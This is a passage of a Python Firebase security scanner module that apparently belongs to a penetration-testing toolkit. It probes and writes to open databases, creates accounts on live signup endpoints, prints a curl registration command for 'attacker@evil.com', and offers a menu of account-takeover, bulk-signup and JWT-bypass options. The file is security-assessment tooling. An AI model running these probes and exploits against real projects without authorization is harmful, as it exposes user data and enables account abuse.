#!/usr/bin/env python3
# modules/Web/firebase_scanner.py

import requests
import json
import re
import sys
import os
import threading
import time
from urllib.parse import urlparse, urljoin
from pathlib import Path
from typing import List, Optional, Dict, Tuple
import subprocess
import glob # Added
import stat # Added, potentially used by _generate_jwt_exploit_script (though that's for removal later, good to have if other parts need it)

# Try different import methods
try:
    from core.base import ToolModule
    from core.colors import Colors
except ImportError:
    try:
        from modules.core.base import ToolModule
        from modules.core.colors import Colors
    except ImportError:
        # Create minimal fallback classes if imports fail
        class ToolModule:
            def __init__(self):
                pass
            def _get_name(self) -> str:
                return ""
            def _get_category(self) -> str:
                return ""
            def _get_command(self) -> str:
                return ""
            def _get_description(self) -> str:
                return ""
            def _get_dependencies(self) -> List[str]:
                return []
            def check_installation(self) -> bool:
                return True
            def run_guided(self) -> None:
                pass
            def run_direct(self) -> None:
                pass
            def get_help(self) -> dict:
                return {}
        
        class Colors:
            CYAN = '\033[96m'
            GREEN = '\033[92m'
            WARNING = '\033[93m'
            FAIL = '\033[91m'
            ENDC = '\033[0m'
            BOLD = '\033[1m'
            RED = '\033[31m'
            YELLOW = '\033[33m'

class FirebaseScannerModule(ToolModule):
    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.project_id = None
        self.api_key = None
        self.database_url = None
        
    def _get_name(self) -> str:
        return "Firebase Scanner"

    def _get_category(self) -> str:
        return "Web"

    def _get_command(self) -> str:
        return "firebase-scanner"

    def _get_description(self) -> str:
        return "Comprehensive Firebase security scanner for misconfigurations and vulnerabilities"

    def _get_dependencies(self) -> List[str]:
        return ["python3", "python3-requests"]

    def _get_script_path(self) -> str:
        return ""

    def get_help(self) -> dict:
        return {
            "title": "Firebase Scanner - Firebase Security Assessment",
            "usage": "use firebase-scanner",
            "desc": "Comprehensive security scanner for Firebase applications that checks for common misconfigurations, exposed databases, authentication bypasses, and other vulnerabilities.",
            "modes": {
                "Guided": "Interactive mode with step-by-step configuration",
                "Direct": "Direct command execution with custom parameters"
            },
            "features": {
                "Database Security": "Check for open Realtime Database and Firestore",
                "Authentication Bypass": "Test for weak authentication rules",
                "Storage Misconfiguration": "Scan Firebase Storage for exposed files",
                "API Key Exposure": "Validate API key restrictions",
                "Admin SDK": "Test for exposed admin endpoints",
                "Cloud Functions": "Enumerate and test cloud functions",
                "Hosting": "Check for source code exposure in hosting",
                "Exploitation": "Active exploitation of found vulnerabilities"
            },
            "examples": [
                'Scan project: my-firebase-project',
                'Full scan with API key: my-firebase-project --api-key AIzaSyBv...',
                'Database only: my-project --database-only',
                'Exploit vulnerabilities: exploit my-project AIza...'
            ],
            "notes": [
                "Requires either project ID or full Firebase URL",
                "API key helps with deeper scanning but not required",
                "Some tests may trigger Firebase security alerts",
                "Use responsibly and only on authorized targets"
            ]
        }

    def _show_banner(self):
        print(f'''
{Colors.CYAN}╔══════════════════════════════════════════╗
║           FIREBASE SCANNER               ║
║     "Firebase Security Assessment"       ║
║         Misconfiguration Hunter          ║
╚══════════════════════════════════════════╝{Colors.ENDC}

{Colors.YELLOW}⚠️  Use only on authorized Firebase projects ⚠️{Colors.ENDC}
''')

    def _extract_firebase_config(self, url_or_project: str) -> bool:
        """Extract Firebase configuration from URL or project ID"""
        try:
            if url_or_project.startswith('http'):
                # Try to extract from URL
                response = self.session.get(url_or_project, timeout=10)
                content = response.text
                
                # Look for Firebase config in the page
                config_patterns = [
                    r'firebase\.initializeApp\(\s*({[^}]+})',
                    r'var\s+firebaseConfig\s*=\s*({[^}]+})',
                    r'const\s+firebaseConfig\s*=\s*({[^}]+})',
                    r'"firebaseConfig":\s*({[^}]+})'
                ]
                
                for pattern in config_patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        try:
                            # Clean up the JSON and parse it
                            json_str = match.group(1)
                            json_str = re.sub(r'(\w+):', r'"\1":', json_str)  # Add quotes to keys
                            json_str = re.sub(r"'", '"', json_str)  # Replace single quotes
                            
                            config = json.loads(json_str)
                            
                            self.project_id = config.get('projectId')
                            self.api_key = config.get('apiKey')
                            self.database_url = config.get('databaseURL')
                            
                            if self.project_id:
                                print(f"{Colors.GREEN}[✓] Firebase config extracted from URL{Colors.ENDC}")
                                print(f"    Project ID: {self.project_id}")
                                return True
                        except json.JSONDecodeError:
                            continue
                
                # If no config found, try to extract project ID from URL patterns
                url_patterns = [
                    r'https://([^.]+)\.firebaseapp\.com',
                    r'https://([^.]+)\.web\.app',
                    r'projectId["\s]*[:=]["\s]*([^"\'\\s,}]+)'
                ]
                
                for pattern in url_patterns:
                    match = re.search(pattern, url_or_project + content)
                    if match:
                        self.project_id = match.group(1)
                        print(f"{Colors.GREEN}[✓] Project ID extracted: {self.project_id}{Colors.ENDC}")
                        return True
                        
            else:
                # Treat as project ID
                self.project_id = url_or_project
                print(f"{Colors.GREEN}[✓] Using project ID: {self.project_id}{Colors.ENDC}")
                return True
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error extracting Firebase config: {e}{Colors.ENDC}")
            
        return False

    def _test_realtime_database(self) -> List[Dict]:
        """Test Firebase Realtime Database for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Realtime Database...{Colors.ENDC}")
        
        # Possible database URLs with correct regional patterns
        db_urls = [
            f"https://{self.project_id}-default-rtdb.firebaseio.com/",
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app/",
            f"https://{self.project_id}.firebaseio.com/",  # Legacy format
        ]
        
        if self.database_url:
            db_urls.insert(0, self.database_url.rstrip('/') + '/')
        
        for db_url in db_urls:
            try:
                print(f"{Colors.CYAN}[*] Testing database URL: {db_url}{Colors.ENDC}")
                
                # Test read access to root
                test_url = db_url + ".json"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check if we actually got data (not just 'null')
                    if content and content.strip() != 'null' and len(content.strip()) > 2:
                        try:
                            data = json.loads(content)
                            data_size = len(str(data)) if data else 0
                            
                            severity = "CRITICAL" if data_size > 100 else "HIGH"
                            vulnerabilities.append({
                                'type': 'Open Realtime Database',
                                'severity': severity,
                                'url': db_url,
                                'description': f'Database allows unauthorized read access ({data_size} chars of data)',
                                'evidence': content[:300] + '...' if len(content) > 300 else content,
                                'impact': 'Complete database content exposure without authentication'
                            })
                            print(f"{Colors.FAIL}[!] {severity}: Open database found at {db_url}{Colors.ENDC}")
                            print(f"    Data size: {data_size} characters")
                            
                            # Test write access
                            test_data = {'scanner_test': {'timestamp': int(time.time()), 'test': True}}
                            write_url = f"{db_url}scanner_test.json"
                            
                            try:
                                write_resp = self.session.put(write_url, json=test_data['scanner_test'], timeout=5)
                                
                                if write_resp.status_code == 200:
                                    vulnerabilities.append({
                                        'type': 'Database Write Access',
                                        'severity': 'CRITICAL',
                                        'url': write_url,
                                        'description': 'Database allows unauthorized write access',
                                        'evidence': f'Successfully wrote test data',
                                        'impact': 'Data can be modified or deleted without authentication'
                                    })
                                    print(f"{Colors.FAIL}[!] CRITICAL: Write access confirmed!{Colors.ENDC}")
                                    
                                    # Clean up test data
                                    try:
                                        self.session.delete(write_url, timeout=3)
                                    except:
                                        pass
                                        
                            except requests.exceptions.RequestException:
                                pass
                            
                            # Test specific sensitive paths if we found data
                            if isinstance(data, dict):
                                sensitive_paths = ['users', 'user', 'admin', 'config', 'settings', 'private', 'secret']
                                existing_paths = [path for path in sensitive_paths if path in data]
                                
                                for path in existing_paths:
                                    path_url = f"{db_url}{path}.json"
                                    try:
                                        path_resp = self.session.get(path_url, timeout=5)
                                        if path_resp.status_code == 200 and path_resp.text != 'null':
                                            path_data = path_resp.text
                                            vulnerabilities.append({
                                                'type': 'Sensitive Data Exposure',
                                                'severity': 'CRITICAL',
                                                'url': path_url,
                                                'description': f'Sensitive path "{path}" accessible without auth',
                                                'evidence': path_data[:200] + '...' if len(path_data) > 200 else path_data,
                                                'impact': 'Sensitive user data or configuration exposed'
                                            })
                                            print(f"{Colors.FAIL}[!] CRITICAL: Sensitive path '{path}' exposed{Colors.ENDC}")
                                    except:
                                        continue
                            
                            break  # Found working database URL, no need to test others
                            
                        except json.JSONDecodeError:
                            # Got response but not valid JSON
                            if len(content.strip()) > 10:  # Some meaningful content
                                vulnerabilities.append({
                                    'type': 'Database Content Exposure',
                                    'severity': 'HIGH',
                                    'url': db_url,
                                    'description': 'Database returns content but not valid JSON',
                                    'evidence': content[:200] + '...' if len(content) > 200 else content,
                                    'impact': 'Database misconfiguration or data corruption'
                                })
                                print(f"{Colors.WARNING}[!] HIGH: Non-JSON content returned from database{Colors.ENDC}")
                    else:
                        print(f"{Colors.GREEN}[✓] Database exists but appears empty or properly secured{Colors.ENDC}")
                        
                elif response.status_code == 401:
                    print(f"{Colors.GREEN}[✓] Database properly secured with authentication at {db_url}{Colors.ENDC}")
                    break  # Found database but it's secured
                    
                elif response.status_code == 404:
                    print(f"{Colors.CYAN}[*] Database not found at {db_url}{Colors.ENDC}")
                    
                else:
                    print(f"{Colors.WARNING}[!] Unexpected response {response.status_code} from {db_url}{Colors.ENDC}")
                    
            except requests.exceptions.RequestException as e:
                print(f"{Colors.WARNING}[!] Could not connect to {db_url}: {str(e)[:50]}...{Colors.ENDC}")
                continue
                
        return vulnerabilities

    def _test_firestore(self) -> List[Dict]:
        """Test Firestore for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firestore...{Colors.ENDC}")
        
        # Firestore REST API endpoint
        base_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        
        try:
            # Test without authentication
            response = self.session.get(base_url, timeout=10)
            
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Open Firestore Database',
                    'severity': 'CRITICAL',
                    'url': base_url,
                    'description': 'Firestore allows unauthorized access',
                    'evidence': response.text[:500] + '...' if len(response.text) > 500 else response.text,
                    'impact': 'Complete database access without authentication'
                })
                print(f"{Colors.FAIL}[!] CRITICAL: Open Firestore found!{Colors.ENDC}")
                
                # Test common collections
                collections = ['users', 'user', 'admin', 'settings', 'config', 'private']
                for collection in collections:
                    coll_url = f"{base_url}/{collection}"
                    coll_resp = self.session.get(coll_url, timeout=5)
                    if coll_resp.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Exposed Firestore Collection',
                            'severity': 'HIGH',
                            'url': coll_url,
                            'description': f'Collection "{collection}" is accessible',
                            'evidence': coll_resp.text[:300] + '...' if len(coll_resp.text) > 300 else coll_resp.text,
                            'impact': 'Sensitive data exposure'
                        })
                        
            elif response.status_code == 403:
                print(f"{Colors.GREEN}[✓] Firestore properly secured{Colors.ENDC}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.WARNING}[!] Could not test Firestore: {e}{Colors.ENDC}")
            
        return vulnerabilities

    def _test_storage(self) -> List[Dict]:
        """Test Firebase Storage for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Storage...{Colors.ENDC}")
        
        # Storage URLs to test
        storage_urls = [
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}.appspot.com/o",
            f"https://storage.googleapis.com/{self.project_id}.appspot.com"
        ]
        
        for storage_url in storage_urls:
            try:
                response = self.session.get(storage_url, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'items' in data and data['items']:
                            vulnerabilities.append({
                                'type': 'Open Firebase Storage',
                                'severity': 'HIGH',
                                'url': storage_url,
                                'description': 'Storage bucket allows unauthorized listing',
                                'evidence': f"Found {len(data['items'])} accessible files",
                                'impact': 'File enumeration and potential data exposure'
                            })
                            print(f"{Colors.FAIL}[!] HIGH: Open storage found with {len(data['items'])} files{Colors.ENDC}")
                            
                            # Check for sensitive files
                            sensitive_patterns = [
                                r'.*\.key$', r'.*\.pem$', r'.*\.p12$', r'.*\.json$',
                                r'.*config.*', r'.*secret.*', r'.*private.*',
                                r'.*backup.*', r'.*dump.*', r'.*\.sql$'
                            ]
                            
                            for item in data['items'][:20]:  # Check first 20 files
                                file_name = item.get('name', '')
                                for pattern in sensitive_patterns:
                                    if re.match(pattern, file_name, re.IGNORECASE):
                                        vulnerabilities.append({
                                            'type': 'Sensitive File Exposure',
                                            'severity': 'CRITICAL',
                                            'url': f"{storage_url}/{file_name}",
                                            'description': f'Potentially sensitive file: {file_name}',
                                            'evidence': f'File pattern matches: {pattern}',
                                            'impact': 'Potential credentials or configuration exposure'
                                        })
                                        break
                                        
                    except json.JSONDecodeError:
                        pass
                        
                elif response.status_code == 403:
                    print(f"{Colors.GREEN}[✓] Storage properly secured{Colors.ENDC}")
                    
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    def _test_authentication(self) -> List[Dict]:
        """Test Firebase Authentication for weaknesses"""
        vulnerabilities = []
        
        if not self.project_id:
            print(f"{Colors.WARNING}[!] Project ID needed for auth testing{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Authentication...{Colors.ENDC}")
        
        # Test REST API endpoints with actual user creation attempts
        if self.api_key:
            # Test user registration with a real attempt
            signup_endpoints = [
                f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}",
                f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key={self.api_key}"
            ]
            
            test_email = f"pentester{int(time.time())}@example.com"
            test_password = "TestPassword123!"
            
            for endpoint in signup_endpoints:
                try:
                    print(f"{Colors.CYAN}[*] Testing signup at: {endpoint.split('/')[-1]}{Colors.ENDC}")
                    
                    # Prepare test data based on endpoint version
                    if "v1/accounts" in endpoint:
                        test_data = {
                            "email": test_email,
                            "password": test_password,
                            "returnSecureToken": True
                        }
                    else:  # v3 endpoint
                        test_data = {
                            "email": test_email,
                            "password": test_password,
                            "returnSecureToken": True
                        }
                    
                    response = self.session.post(endpoint, json=test_data, timeout=10)
                    
                    if response.status_code == 200:
                        # Successfully created user - this IS a vulnerability
                        try:
                            resp_data = response.json()
                            user_id = resp_data.get('localId', 'unknown')
                            id_token = resp_data.get('idToken', '')
                            
                            vulnerabilities.append({
                                'type': 'Unrestricted User Registration',
                                'severity': 'HIGH',
                                'url': endpoint,
                                'description': f'Successfully created user account without restrictions',
                                'evidence': f'Created user ID: {user_id}, got auth token',
                                'impact': 'Attackers can create unlimited accounts, potential for abuse, spam, or resource exhaustion',
                                'exploitation': f'curl -X POST "{endpoint}" -H "Content-Type: application/json" -d \'{{"email":"attacker@evil.com","password":"password123","returnSecureToken":true}}\''
                            })
                            print(f"{Colors.FAIL}[!] HIGH: Successfully created test user {test_email}{Colors.ENDC}")
                            
                            # Test if we can get user info with the token
                            if id_token:
                                profile_endpoints = [
                                    f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={self.api_key}",
                                    f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={self.api_key}"
                                ]
                                
                                for profile_endpoint in profile_endpoints:
                                    try:
                                        profile_data = {"idToken": id_token}
                                        profile_resp = self.session.post(profile_endpoint, json=profile_data, timeout=5)
                                        
                                        if profile_resp.status_code == 200:
                                            profile_info = profile_resp.json()
                                            vulnerabilities.append({
                                                'type': 'User Profile Information Disclosure',
                                                'severity': 'MEDIUM',
                                                'url': profile_endpoint,
                                                'description': 'Created user profile is accessible',
                                                'evidence': f'Retrieved profile data: {str(profile_info)[:200]}...',
                                                'impact': 'User profile information can be accessed after account creation'
                                            })
                                            print(f"{Colors.WARNING}[!] Can access user profile after creation{Colors.ENDC}")
                                            break
                                    except:
                                        continue
                            
                            # Try to delete the test user (cleanup)
                            try:
                                delete_endpoints = [
                                    f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={self.api_key}",
                                    f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/deleteAccount?key={self.api_key}"
                                ]
                                
                                for delete_endpoint in delete_endpoints:
                                    delete_data = {"idToken": id_token} if id_token else {"localId": user_id}
                                    delete_resp = self.session.post(delete_endpoint, json=delete_data, timeout=5)
                                    if delete_resp.status_code == 200:
                                        print(f"{Colors.GREEN}[✓] Cleaned up test user{Colors.ENDC}")
                                        break
                            except:
                                print(f"{Colors.WARNING}[!] Could not cleanup test user {test_email}{Colors.ENDC}")
                            
                        except json.JSONDecodeError:
                            # Got 200 but invalid JSON - still might be vulnerable
                            vulnerabilities.append({
                                'type': 'Authentication Endpoint Accessible',
                                'severity': 'MEDIUM',
                                'url': endpoint,
                                'description': 'Signup endpoint returns HTTP 200 but invalid response',
                                'evidence': f'Response: {response.text[:200]}...',
                                'impact': 'Authentication system may be misconfigured'
                            })
                            
                    elif response.status_code == 400:
                        # Check the error message to understand why it failed
                        try:
                            error_data = response.json()
                            error_message = error_data.get('error', {}).get('message', '')
                            
                            if 'EMAIL_EXISTS' in error_message:
                                print(f"{Colors.GREEN}[✓] Signup works but email validation prevents duplicate{Colors.ENDC}")
                            elif 'OPERATION_NOT_ALLOWED' in error_message:
                                print(f"{Colors.GREEN}[✓] User registration is properly disabled{Colors.ENDC}")
                            elif 'WEAK_PASSWORD' in error_message:
                                # This means registration is enabled but has password requirements
                                vulnerabilities.append({
                                    'type': 'Registration Enabled with Weak Controls',
                                    'severity': 'MEDIUM',
                                    'url': endpoint,
                                    'description': 'User registration is enabled but rejected due to weak password policy',
                                    'evidence': f'Error: {error_message}',
                                    'impact': 'Registration is possible with stronger passwords'
                                })
                                print(f"{Colors.WARNING}[!] MEDIUM: Registration enabled, strengthen password and retry{Colors.ENDC}")
                            elif 'INVALID_EMAIL' in error_message:
                                print(f"{Colors.GREEN}[✓] Email validation working properly{Colors.ENDC}")
                            else:
                                print(f"{Colors.WARNING}[!] Unexpected auth error: {error_message}{Colors.ENDC}")
                                
                        except json.JSONDecodeError:
                            print(f"{Colors.WARNING}[!] Auth endpoint returned 400 with non-JSON response{Colors.ENDC}")
                            
                    elif response.status_code == 403:
                        print(f"{Colors.GREEN}[✓] User registration properly restricted{Colors.ENDC}")
                        
                    elif response.status_code == 404:
                        print(f"{Colors.CYAN}[*] Auth endpoint not found: {endpoint.split('/')[-1]}{Colors.ENDC}")
                        
                    else:
                        print(f"{Colors.WARNING}[!] Unexpected response {response.status_code} from auth endpoint{Colors.ENDC}")
                        
                except requests.exceptions.RequestException as e:
                    print(f"{Colors.WARNING}[!] Could not test auth endpoint: {e}{Colors.ENDC}")
        
        # Test for exposed authentication configuration
        config_urls = [
            f"https://{self.project_id}.firebaseapp.com/__/firebase/init.json",
            f"https://{self.project_id}.web.app/__/firebase/init.json",
            f"https://{self.project_id}.firebaseapp.com/firebase-config.js",
            f"https://{self.project_id}.firebaseapp.com/__/firebase/config.json"
        ]
        
        for config_url in config_urls:
            try:
                response = self.session.get(config_url, timeout=5)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check if it contains sensitive configuration
                    sensitive_indicators = [
                        'apiKey', 'authDomain', 'databaseURL', 'projectId',
                        'storageBucket', 'messagingSenderId', 'appId'
                    ]
                    
                    if any(indicator in content for indicator in sensitive_indicators):
                        try:
                            config_data = response.json()
                            vulnerabilities.append({
                                'type': 'Firebase Configuration Exposure',
                                'severity': 'LOW',
                                'url': config_url,
                                'description': 'Firebase configuration publicly accessible',
                                'evidence': f'Config keys: {list(config_data.keys()) if isinstance(config_data, dict) else "Invalid JSON"}',
                                'impact': 'API keys and project configuration exposed (normal for client-side apps but should be noted)'
                            })
                            print(f"{Colors.YELLOW}[!] LOW: Firebase config exposed (normal for web apps){Colors.ENDC}")
                        except json.JSONDecodeError:
                            if len(content) > 50:  # Substantial content
                                vulnerabilities.append({
                                    'type': 'Configuration File Exposure',
                                    'severity': 'MEDIUM',
                                    'url': config_url,
                                    'description': 'Configuration file accessible but contains non-JSON data',
                                    'evidence': content[:200] + '...' if len(content) > 200 else content,
                                    'impact': 'Potential configuration or sensitive data exposure'
                                })
                                
            except requests.exceptions.RequestException:
                continue
            
        return vulnerabilities

    def _test_cloud_functions(self) -> List[Dict]:
        """Test for exposed Cloud Functions"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Cloud Functions...{Colors.ENDC}")
        
        # Common function names to test
        function_names = [
            'api', 'webhook', 'admin', 'test', 'debug', 'dev',
            'upload', 'download', 'process', 'sync', 'backup',
            'user', 'auth', 'login', 'register', 'verify'
        ]
        
        # Possible regions
        regions = ['us-central1', 'europe-west1', 'asia-east1']
        
        for region in regions:
            for func_name in function_names:
                func_url = f"https://{region}-{self.project_id}.cloudfunctions.net/{func_name}"
                
                try:
                    response = self.session.get(func_url, timeout=5)
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Exposed Cloud Function',
                            'severity': 'MEDIUM',
                            'url': func_url,
                            'description': f'Cloud function "{func_name}" is accessible',
                            'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text,
                            'impact': 'Potential unauthorized function execution'
                        })
                        print(f"{Colors.WARNING}[!] Found function: {func_name}{Colors.ENDC}")
                        
                    elif response.status_code == 403:
                        print(f"{Colors.GREEN}[✓] Function {func_name} properly secured{Colors.ENDC}")
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return vulnerabilities

    def _test_api_keys(self) -> List[Dict]:
        """Test API key restrictions and validity"""
        vulnerabilities = []
        
        if not self.api_key:
            print(f"{Colors.WARNING}[!] No API key to test{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing API Key Security...{Colors.ENDC}")
        
        # First, test if the API key is actually valid and functional
        test_url = f"https://firebase.googleapis.com/v1beta1/projects/{self.project_id}"
        
        try:
            response = self.session.get(f"{test_url}?key={self.api_key}", timeout=10)
            
            if response.status_code == 403:
                error_data = response.json() if response.content else {}
                error_message = error_data.get('error', {}).get('message', '')
                
                if 'API key not valid' in error_message:
                    print(f"{Colors.FAIL}[!] API key is invalid or expired{Colors.ENDC}")
                    return vulnerabilities
                elif 'restricted' in error_message.lower():
                    print(f"{Colors.GREEN}[✓] API key has proper restrictions{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] API key restriction unclear: {error_message}{Colors.ENDC}")
                    
            elif response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Overprivileged API Key',
                    'severity': 'HIGH',
                    'url': test_url,
                    'description': 'API key has access to project management APIs',
                    'evidence': f'HTTP 200 response to project details endpoint',
                    'impact': 'API key may have excessive permissions'
                })
                print(f"{Colors.FAIL}[!] HIGH: API key has project-level access{Colors.ENDC}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.WARNING}[!] Could not test API key validity: {e}{Colors.ENDC}")
        
        # Test API key with different HTTP referrers (more realistic test)
        print(f"{Colors.CYAN}[*] Testing referrer restrictions...{Colors.ENDC}")
        
        # Use Firebase's actual config endpoint which is more likely to respect referrer restrictions
        config_test_url = f"https://{self.project_id}.firebaseapp.com/__/firebase/init.json?key={self.api_key}"
        
        test_referrers = [
            'https://malicious-site.com',
            'https://evil.com', 
            'http://localhost:3000',
            'https://attacker.firebaseapp.com'
        ]
        
        baseline_response = None
        try:
            # Get baseline response without referrer
            baseline_response = self.session.get(config_test_url, timeout=5)
        except:
            pass
        
        restriction_bypassed = False
        
        for referrer in test_referrers:
            headers = {
                'Referer': referrer,
                'Origin': referrer
            }
            
            try:
                response = self.session.get(config_test_url, headers=headers, timeout=5)
                
                # If we get same response as baseline, restrictions might be bypassed
                if (baseline_response and 
                    response.status_code == baseline_response.status_code and 
                    response.status_code == 200):
                    
                    restriction_bypassed = True
                    print(f"{Colors.WARNING}[!] API key works with referrer: {referrer}{Colors.ENDC}")
                    
            except requests.exceptions.RequestException:
                continue
        
        if restriction_bypassed:
            vulnerabilities.append({
                'type': 'Weak API Key Restrictions',
                'severity': 'MEDIUM',
                'url': config_test_url,
                'description': 'API key lacks proper referrer restrictions',
                'evidence': f'API key accessible from unauthorized referrers',
                'impact': 'API key could be abused from malicious websites'
            })
        else:
            print(f"{Colors.GREEN}[✓] API key appears to have proper referrer restrictions{Colors.ENDC}")
        
        # Test for exposed service account keys (different from web API keys)
        service_account_patterns = [
            f"https://{self.project_id}.firebaseapp.com/service-account-key.json",
            f"https://{self.project_id}.web.app/service-account-key.json",
            f"https://{self.project_id}.firebaseapp.com/firebase-adminsdk.json",
            f"https://{self.project_id}.firebaseapp.com/.env",
        ]
        
        for sa_url in service_account_patterns:
            try:
                sa_response = self.session.get(sa_url, timeout=5)
                if sa_response.status_code == 200:
                    content = sa_response.text
                    if ('private_key' in content or 
                        'service_account' in content.lower() or
                        'firebase_admin' in content.lower()):
                        
                        vulnerabilities.append({
                            'type': 'Exposed Service Account Key',
                            'severity': 'CRITICAL',
                            'url': sa_url,
                            'description': 'Service account credentials publicly accessible',
                            'evidence': 'Found private_key or service account indicators',
                            'impact': 'Complete Firebase project compromise possible'
                        })
                        print(f"{Colors.FAIL}[!] CRITICAL: Service account key exposed at {sa_url}{Colors.ENDC}")
                        
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    def _test_hosting(self) -> List[Dict]:
        """Test Firebase Hosting for issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Hosting...{Colors.ENDC}")
        
        # Hosting URLs
        hosting_urls = [
            f"https://{self.project_id}.web.app",
            f"https://{self.project_id}.firebaseapp.com"
        ]
        
        for base_url in hosting_urls:
            try:
                response = self.session.get(base_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check for exposed source maps
                    if '.map' in content:
                        map_urls = re.findall(r'sourceMappingURL=([^\s]+\.map)', content)
                        for map_url in map_urls:
                            full_map_url = urljoin(base_url, map_url)
                            map_resp = self.session.get(full_map_url, timeout=5)
                            if map_resp.status_code == 200:
                                vulnerabilities.append({
                                    'type': 'Source Map Exposure',
                                    'severity': 'MEDIUM',
                                    'url': full_map_url,
                                    'description': 'Source maps are publicly accessible',
                                    'evidence': f'Source map found: {map_url}',
                                    'impact': 'Source code structure exposure'
                                })
                    
                    # Check for exposed config files
                    config_files = [
                        '/.env', '/config.json', '/firebase.json', '/.firebaserc',
                        '/admin-config.json', '/service-account.json'
                    ]
                    
                    for config_file in config_files:
                        config_url = base_url + config_file
                        config_resp = self.session.get(config_url, timeout=5)
                        if config_resp.status_code == 200:
                            vulnerabilities.append({
                                'type': 'Configuration File Exposure',
                                'severity': 'HIGH',
                                'url': config_url,
                                'description': f'Configuration file exposed: {config_file}',
                                'evidence': config_resp.text[:200] + '...' if len(config_resp.text) > 200 else config_resp.text,
                                'impact': 'Potential credentials or sensitive configuration exposure'
                            })
                            
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    # Update the main exploitation menu to include JWT testing
    def _exploit_user_registration(self, endpoint: str, api_key: str) -> None:
        """Interactive exploitation of user registration vulnerability (Enhanced)"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║       ENHANCED EXPLOITATION MODULE       ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}[*] Exploiting User Registration at: {endpoint}{Colors.ENDC}")
        
        while True:
            print(f"\n{Colors.CYAN}[*] Exploitation Options:{Colors.ENDC}")
            print("1. Create single user account")
            print("2. Create multiple user accounts (bulk)")
            print("3. Create admin-like account")
            print("4. Extract user information (Enhanced)")
            print("5. Test account modification/takeover")
            print("6. Test email verification bypass (Comprehensive)")
            print("7. Test JWT manipulation bypass (Comprehensive)")
            # Option 8 "Generate exploitation script" is removed as per plan
            print("8. Back to main menu") # Renumbered from 9
            
            choice = input(f"\n{Colors.BOLD}[+] Select option (1-8): {Colors.ENDC}").strip()
            
            if choice == "1":
                self._create_single_user(endpoint, api_key)
            elif choice == "2":
                self._create_bulk_users(endpoint, api_key)
            elif choice == "3":
                self._create_admin_user(endpoint, api_key)
            elif choice == "4":
                self._extract_user_info(api_key) # Assumes this existing method is suitable
            elif choice == "5":
                self._test_account_modification(api_key)
            elif choice == "6":
                self._test_email_verification_bypass(api_key) # New comprehensive version
            elif choice == "7":
                self._test_jwt_manipulation_bypass(api_key) # New comprehensive version
            elif choice == "8": # Renumbered from 9
                break
            else:
                print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

    def _test_account_modification(self, api_key: str) -> None:
        """Test various account modification and potential takeover scenarios."""
        print(f"\n{Colors.CYAN}[*] Account Modification and Takeover Testing{Colors.ENDC}")
        
        user_creds = None # Initialize user_creds outside the loop for broader scope if needed later

        while True: # Main loop for this menu
            # Option 1: Use existing token
            print(f"\n{Colors.CYAN}[*] Select User for Testing:{Colors.ENDC}")
            print("1. Use existing user token from saved file (e.g., firebase_user_*.json)")
            print("2. Create a new user for testing")
            print("3. Select from previously found users")
            print("4. Back to previous menu") # Renumbered
            
            choice = input(f"{Colors.BOLD}[+] Select option (1-4): {Colors.ENDC}").strip() # Updated range
            
            if choice == "1":
                token_file_path = input(f"{Colors.BOLD}[+] Enter path to single-user token file (e.g., firebase_user_XYZ.json, firebase_enum_user_email.json): {Colors.ENDC}").strip()
                try:
                    with open(token_file_path, 'r') as f:
                        user_data = json.load(f)

                    if isinstance(user_data, list):
